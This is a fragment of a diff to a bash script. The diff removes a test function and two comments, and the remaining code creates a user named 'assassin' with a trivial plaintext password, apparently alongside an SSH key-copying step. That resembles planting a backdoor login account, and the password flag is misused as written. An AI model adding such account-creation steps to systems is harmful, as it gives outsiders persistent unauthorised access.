@@ -1,14 +1,6 @@
 #!/bin/bash
 
 
-test(){
-  echo "this is a fucking test!"  # ignore this
-
-}
-
-
-# add new user assassin
-
 user(){
   useradd -m -p password -s /bin/bash assassin
   sleep 3
@@ -17,7 +9,6 @@ user(){
 }
 
 
-# ssh-copy-id over
 
 copy() {
 
